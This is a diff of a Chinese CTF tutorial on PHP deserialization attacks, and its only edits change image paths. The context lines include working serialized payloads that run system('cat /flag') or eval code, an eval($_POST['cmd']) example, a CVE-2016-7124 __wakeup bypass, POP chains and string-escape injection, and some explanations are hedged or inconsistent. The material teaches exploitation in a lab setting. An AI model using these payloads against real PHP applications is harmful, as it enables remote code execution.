@@ -54,27 +54,27 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
 *   **原理:** 反序列化可以创建指定类的对象实例，并控制其属性值。
 *   **示例 (Level 1 - 类的实例化):**
     *   代码要求传入一个 `FLAG` 类的实例。
-    ![类的实例化 1](/hello_ctf/images/Serialize1.png)
+    ![类的实例化 1](./images/Serialize1.png)
     *   Payload: 直接在代码中创建实例 `code=$flag=new FLAG();` (这里是直接代码执行，非反序列化场景，但演示了目标对象)
-    ![类的实例化 2](/hello_ctf/images/Serialize2.png)
+    ![类的实例化 2](./images/Serialize2.png)
 *   **示例 (Level 2 - 值的传递):**
     *   代码需要将 `$flag_string` 的值赋给 `$target` 对象的某个属性。
-    ![值的传递 1](/hello_ctf/images/Serialize3.png)
+    ![值的传递 1](./images/Serialize3.png)
     *   Payload 1 (非预期): `echo $flag_string;`
-    ![值的传递 2](/hello_ctf/images/Serialize4.png)
+    ![值的传递 2](./images/Serialize4.png)
     *   Payload 2 (预期解): `$target->free_flag=$flag_string;`
-    ![值的传递 3](/hello_ctf/images/Serialize5.png)
+    ![值的传递 3](./images/Serialize5.png)
 
 ### 2. 访问控制与序列化格式 (Access Modifiers & Serialized Format)
 
 *   **原理:** `protected` 和 `private` 属性在序列化时有特殊的前缀格式，包含空字节 (`\0`)。理解并正确构造这些格式是控制非 `public` 属性的关键。同时，类的访问控制规则（`protected` 可在子类访问，`private` 仅在当前类）依然适用。
 *   **示例 (Level 3 - 值的权限):**
     *   考察如何访问不同权限的属性。
-    ![值的权限 1](/hello_ctf/images/Serialize6.png)
+    ![值的权限 1](./images/Serialize6.png)
     *   Payload 1 (直接访问): `echo $target->public_flag; echo $target->get_protected_flag(); echo $target->get_private_flag();` (通过 getter 方法访问)
-    ![值的权限 2](/hello_ctf/images/Serialize7.png)
+    ![值的权限 2](./images/Serialize7.png)
     *   Payload 2 (子类访问): `echo $sub_target->public_flag; echo $sub_target->show_protected_flag(); echo $target->get_private_flag();` (子类可直接访问 public，通过子类方法访问 protected)
-    ![值的权限 3](/hello_ctf/images/Serialize8.png)
+    ![值的权限 3](./images/Serialize8.png)
 *   **示例 (Level 4 - 初体验 & Level 5 - 普通值规则):**
     *   Level 4: 使用 `echo serialize($flag_is_here);` 获取对象的序列化字符串，暴露属性值。
     *   Level 5: 手动构造包含各种数据类型（布尔、NULL、字符串、整数、对象、数组）的序列化字符串。
@@ -92,8 +92,8 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         ```
 *   **示例 (Level 6 - 权限修饰规则):**
     *   手动构造包含 `protected` (`\0*\0`) 和 `private` (`\0ClassName\0`) 属性的序列化字符串。
-    ![权限修饰规则 1](/hello_ctf/images/Serialize9.png) (代码定义)
-    ![权限修饰规则 2](/hello_ctf/images/Serialize10.png) (构造的 Payload)
+    ![权限修饰规则 1](./images/Serialize9.png) (代码定义)
+    ![权限修饰规则 2](./images/Serialize10.png) (构造的 Payload)
     *   **Payload 示例 (需要 URL 编码空字节):**
         ```
         O:4:"Main":3:{s:14:"%00Main%00secret";s:4:"flag";s:12:"%00*%00common";s:4:"flag";s:6:"public";s:4:"flag";} 
@@ -104,7 +104,7 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
 *   **原理:** 当 `unserialize()` 处理用户可控的数据时，攻击者可以构造序列化字符串来实例化任意已定义的类，并控制其属性。如果这些类中存在某些魔术方法（特别是 `__destruct`, `__wakeup`）执行了危险操作（如 `eval()`, `system()`, 文件包含/删除，SQL 查询等），并且这些操作受到对象属性值的影响，就可能导致漏洞。
 *   **示例 (Level 7 - 实例化和反序列化):**
     *   代码存在 `unserialize($obj_string)`，且 `FLAG` 类有 `backdoor()` 方法可执行命令，该方法在 `__destruct()` 中可能被间接调用或直接利用。
-    ![实例化和反序列化 1](/hello_ctf/images/Serialize11.png) (类定义显示 `__destruct` 调用 `backdoor`，`backdoor` 执行 `$this->key`)
+    ![实例化和反序列化 1](./images/Serialize11.png) (类定义显示 `__destruct` 调用 `backdoor`，`backdoor` 执行 `$this->key`)
     *   **构造 Payload:** 创建一个 `FLAG` 类的序列化对象，将 `key` 属性设置为要执行的 PHP 代码（例如 `system('ls');` 或 `eval($_POST["cmd"]);`）。
         ```php
         <?php
@@ -118,11 +118,11 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         ?>
         ```
         生成的 payload: `O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D`
-    ![实例化和反序列化 2](/hello_ctf/images/Serialize12.png) (传递构造的序列化字符串)
-    ![实例化和反序列化 3](/hello_ctf/images/Serialize13.png) (成功执行命令，获取 Flag)
+    ![实例化和反序列化 2](./images/Serialize12.png) (传递构造的序列化字符串)
+    ![实例化和反序列化 3](./images/Serialize13.png) (成功执行命令，获取 Flag)
 *   **示例 (Level 8 - GC 机制):**
     *   `__construct` 初始化 `$flag=0`，`__destruct` 不初始化，`check` 函数检查 `$flag`。目标是通过多次调用 `__destruct` 来绕过 `__construct` 的初始化，使得 `check` 函数执行时 `$flag` 仍然是触发 `__destruct` 前的值。
-    ![GC机制 1](/hello_ctf/images/Serialize14.png)
+    ![GC机制 1](./images/Serialize14.png)
     *   **Payload:** 创建多个对象，然后 `unset` 掉它们触发 `__destruct`，最后调用 `check`。
         ```php
         $a = new Vuln(); 
@@ -133,10 +133,10 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         unset($c); // 多次触发 __destruct
         check($target); // 此时 $flag 可能未被重置为 0
         ```
-    ![GC机制 2](/hello_ctf/images/Serialize15.png) (获取 Flag)
+    ![GC机制 2](./images/Serialize15.png) (获取 Flag)
 *   **示例 (Level 9 - 构造函数的后门):**
     *   `FLAG` 类的 `__destruct` 方法包含 `eval($this->cmd);`。
-    ![构造函数的后门 1](/hello_ctf/images/Serialize16.jpeg) (类定义)
+    ![构造函数的后门 1](./images/Serialize16.jpeg) (类定义)
     *   **Payload:** 创建 `FLAG` 对象，设置 `cmd` 属性为要执行的代码（注意 flag 在环境变量中，使用 `getenv('FLAG')`）。
         ```php
         <?php
@@ -149,11 +149,11 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         ?> 
         ```
         生成的 payload: `O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A22%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D`
-    ![构造函数的后门 2](/hello_ctf/images/Serialize17.png) (执行 Payload 获取 Flag)
+    ![构造函数的后门 2](./images/Serialize17.png) (执行 Payload 获取 Flag)
 
 *   **示例 (Level 10 - `__wakeup()`):**
     *   `__wakeup()` 方法在反序列化后执行，其中包含获取 flag 的逻辑。
-    ![__wakeup() 1](/hello_ctf/images/Serialize18.png) (类定义)
+    ![__wakeup() 1](./images/Serialize18.png) (类定义)
     *   **Payload:** 只需提供一个该类的合法序列化字符串即可触发 `__wakeup()`。
         ```php
         <?php
@@ -167,7 +167,7 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         ?>
         ```
         Payload: `O%3A4%3A%22INFO%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22guest%22%3B%7D`
-    ![__wakeup() 2](/hello_ctf/images/Serialize19.png) (获取 Flag)
+    ![__wakeup() 2](./images/Serialize19.png) (获取 Flag)
 
 ### 4. `__wakeup()` 绕过 (Bypass __wakeup - CVE-2016-7124)
 
@@ -175,7 +175,7 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
 *   **利用:** 如果 `__wakeup()` 方法包含一些安全检查或重置属性的操作，可以通过此漏洞绕过这些操作，直接进入 `__destruct()` 或其他利用阶段。
 *   **示例 (Level 11 - CVE-2016-7124):**
     *   `__wakeup()` 会将关键属性 `$cmd` 重置为 `null`，而 `__destruct` 会执行 `$cmd`。
-    ![CVE-2016-7124 1](/hello_ctf/images/Serialize20.png) (类定义)
+    ![CVE-2016-7124 1](./images/Serialize20.png) (类定义)
     *   **Payload:** 构造 `FLAG` 对象的序列化字符串，设置好 `$cmd`，然后**手动修改**对象属性数量的值（例如，如果实际只有 1 个属性 `cmd`，则将 `O:4:"FLAG":1:{...}` 修改为 `O:4:"FLAG":2:{...}` 或更大）。
         ```php
         <?php
@@ -192,35 +192,35 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         ?>
         ```
         Payload: `O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A22%3A%22system%28%5C%22cat+%2Fflag%5C%22%29%3B%22%3B%7D`
-    ![CVE-2016-7124 2](/hello_ctf/images/Serialize21.png) (发送修改后的 Payload，成功绕过 `__wakeup` 并执行命令)
+    ![CVE-2016-7124 2](./images/Serialize21.png) (发送修改后的 Payload，成功绕过 `__wakeup` 并执行命令)
 
 ### 5. 其他魔术方法利用 (`__sleep()`, `__toString()`, `__invoke()`)
 
 *   **`__sleep()` (Level 12):**
     *   **原理:** `__sleep()` 在 `serialize()` 时调用，控制哪些属性被序列化。`private` 属性名需要包含 `\0ClassName\0` 前缀，`static` 属性无法被序列化。
-    ![__sleep() 1](/hello_ctf/images/Serialize22.png) (类定义)
+    ![__sleep() 1](./images/Serialize22.png) (类定义)
     *   **利用:** 理解其行为，构造序列化字符串时只包含 `__sleep()` 返回的属性，并使用正确的格式。如果 `__sleep` 本身存在逻辑漏洞，也可能被利用。
-    ![__sleep() 2](/hello_ctf/images/Serialize23.png) (构造 Payload，确保只包含 `__sleep` 允许的属性且格式正确)
+    ![__sleep() 2](./images/Serialize23.png) (构造 Payload，确保只包含 `__sleep` 允许的属性且格式正确)
 
 *   **`__toString()` (Level 13):**
     *   **原理:** 当对象被用作字符串时调用。如果 `unserialize()` 后的代码中有将对象当作字符串处理的地方（如 `echo $obj;`），则会触发 `__toString()`。
-    ![__toString() 1](/hello_ctf/images/Serialize24.png) (类定义，`__toString` 返回 `$flag`)
+    ![__toString() 1](./images/Serialize24.png) (类定义，`__toString` 返回 `$flag`)
     *   **利用:** 反序列化对象后，在代码中触发字符串转换即可。
         ```php
         $a = unserialize($user_input); 
         echo $a; // Triggers $a->__toString()
         ```
-    ![__toString() 2](/hello_ctf/images/Serialize25.png) (Payload: `echo $obj;` 触发 `__toString` 获取 flag)
+    ![__toString() 2](./images/Serialize25.png) (Payload: `echo $obj;` 触发 `__toString` 获取 flag)
 
 *   **`__invoke()` (Level 14):**
     *   **原理:** 当对象被当作函数调用时执行。
-    ![__invoke() 1](/hello_ctf/images/Serialize26.png) (类定义，`__invoke` 根据参数返回 flag)
+    ![__invoke() 1](./images/Serialize26.png) (类定义，`__invoke` 根据参数返回 flag)
     *   **利用:** 反序列化对象后，在代码中像函数一样调用它。
         ```php
         $a = unserialize($user_input);
         $a('get_flag'); // Triggers $a->__invoke('get_flag')
         ```
-    ![__invoke() 2](/hello_ctf/images/Serialize27.png) (Payload: `$obj('get_flag');` 触发 `__invoke` 获取 flag)
+    ![__invoke() 2](./images/Serialize27.png) (Payload: `$obj('get_flag');` 触发 `__invoke` 获取 flag)
 
 ### 6. POP 链构造 (Property Oriented Programming - POP Chain Construction)
 
@@ -236,7 +236,7 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         5.  需要 `A` 实例的 `$a` 属性是 `B` 类的实例。
         6.  需要 `B` 实例的 `$b` 属性是 `C` 类的实例。
         7.  需要 `C` 实例的 `$c` 属性包含要执行的代码。
-    ![POP链前置 1](/hello_ctf/images/Serialize28.png) (类定义)
+    ![POP链前置 1](./images/Serialize28.png) (类定义)
     *   **构造 Payload:** 逐层嵌套创建对象。
         ```php
         <?php
@@ -255,8 +255,8 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         echo urlencode(serialize($d_obj));
         ?>
         ```
-    ![POP链前置 2](/hello_ctf/images/Serialize29.png) (构造好的序列化字符串)
-    ![POP链前置 3](/hello_ctf/images/Serialize30.png) (执行 Payload 获取 Flag)
+    ![POP链前置 2](./images/Serialize29.png) (构造好的序列化字符串)
+    ![POP链前置 3](./images/Serialize30.png) (执行 Payload 获取 Flag)
 
 *   **示例 (Level 16 - POP 链构造):**
     *   **目标:** 获取 `$flag` 变量的值。
@@ -266,7 +266,7 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         2.  `echo $this->name;` 将 `$name` 当作字符串使用。需要 `$name` 是 `B` 类的实例，以触发 `B::__toString`。
         3.  `B::__toString` 返回 `$this->b`。需要 `$b` 是 `A` 类的实例，并以函数方式调用它，以触发 `A::__invoke`。
         4.  `A::__invoke` 返回 `$flag`。
-    ![POP链构造 1](/hello_ctf/images/Serialize31.png) (类定义)
+    ![POP链构造 1](./images/Serialize31.png) (类定义)
     *   **构造 Payload:**
         ```php
         <?php
@@ -281,8 +281,8 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
         echo urlencode(serialize($init_obj));
         ?>
         ```
-    ![POP链构造 2](/hello_ctf/images/Serialize32.png) (构造好的 Payload)
-    ![POP链构造 3](/hello_ctf/images/Serialize33.png) (获取 Flag)
+    ![POP链构造 2](./images/Serialize32.png) (构造好的 Payload)
+    ![POP链构造 3](./images/Serialize33.png) (获取 Flag)
 
 ### 7. 字符串逃逸 / 类型混淆 (String Escape / Type Confusion via Serialization)
 
@@ -291,15 +291,15 @@ PHP 的序列化 (`serialize()`) 是将 PHP 的值（包括对象、数组、基
     *   假设 `filter` 函数将 `ctfhub` 替换为 `hello` (长度从 6 变为 5，减少)。或者（更常见的利用）将 `x` 替换为 `xx` (长度增加)。
     *   如果属性值中包含的字符被替换后**长度增加**，会导致 `unserialize` 读取的字符数少于实际应读取的，从而将原本属于该属性值一部分的字符错误地解析为后续的属性定义或对象结束符。
     *   **利用:** 通过精确计算，构造一个属性值，使其经过 filter 增/减长度后，正好能“吃掉”或“留下”一部分字符，形成我们想要的序列化结构（例如，注入一个新的属性或闭合当前对象并开始一个新的对象定义）。
-    ![字符串逃逸 1](/hello_ctf/images/Serialize34.png) (代码，filter 未知，但目标是添加 `admin=1` 属性)
+    ![字符串逃逸 1](./images/Serialize34.png) (代码，filter 未知，但目标是添加 `admin=1` 属性)
     *   **Payload:** 需要构造 `$value`，使其长度变化后能注入 `";s:5:"admin";i:1;}`。假设 filter 将 `xx` 替换为 `yyy` (长度+1)。我们需要注入 19 个字符。构造 `$value` 包含 19 个 `xx`，再加上原本的 `";s:5:"value";s:5:"guest";}`。filter 后，19 个 `xx` 变为 19 个 `yyy` (长度增加 19)，序列化时 `s:L:"...xx..."` 中的 `L` 是基于原始长度计算的。`unserialize` 时，按照 `L` 读取，会提前结束，然后把本应是值一部分的 `";s:5:"admin";i:1;}` 解析为新的属性。
-    ![字符串逃逸 2](/hello_ctf/images/Serialize35.png) (构造 Payload，注入 `admin` 属性)
-    ![字符串逃逸 3](/hello_ctf/images/Serialize36.png) (获取 Flag)
+    ![字符串逃逸 2](./images/Serialize35.png) (构造 Payload，注入 `admin` 属性)
+    ![字符串逃逸 3](./images/Serialize36.png) (获取 Flag)
 
 *   **示例 (Level 18 - 字符串逃逸2 - 长度减少):**
     *   目标是将 `Demo` 类对象变为 `FLAG` 类对象。`filter` 将 `FLAG` 替换为 `Demo` (长度从 4 变为 4，不变？或者假设 filter 将 `badword` 替换为 `good`，长度减少)。
     *   如果属性值中包含的字符被替换后**长度减少**，会导致 `unserialize` 按原长度读取，从而“吞噬”掉原本序列化字符串中紧跟其后的字符（例如属性分隔符 `;` 或引号 `"`）。
     *   **利用:** 构造一个属性值，使其经过 filter 长度减少后，正好吞掉后面的 `";}`，然后紧接着构造一个新的对象序列化字符串 `O:4:"FLAG":...`。
-    ![字符串逃逸2 1](/hello_ctf/images/Serialize37.png) (代码，目标是将 `Demo` 替换为 `FLAG`)
+    ![字符串逃逸2 1](./images/Serialize37.png) (代码，目标是将 `Demo` 替换为 `FLAG`)
     *   **Payload:** 假设 `name` 属性的值会经过 filter。构造 `name` 的值，使其包含足够多的、会被缩短的子串，使得总长度减少量恰好等于 `";s:5:"value";s:8:"aaaaaaaa";}` 的长度 (28 字符)。然后在这个 name 值后面直接拼接 `";s:5:"value";s:8:"aaaaaaaa";}O:4:"FLAG":0:{}`。`unserialize` 时，读取 name 会吞掉后面的 `";s:5:"value";...;}`, 然后直接开始解析 `O:4:"FLAG":0:{}`。
     *   (实际 Level 18 的解法可能是利用 filter 将 `FLAG` 替换为 `Demo` 的特性，通过精心构造的属性值，使得替换后形成 `...";s:4:"name";s:XX:"...Demo...";s:5:"value";s:4:"FLAG";}` 这样的结构，利用引号匹配错误来注入 `FLAG` 字符串到 value 属性中。这更像是利用 filter 逻辑而非单纯的长度变化。)
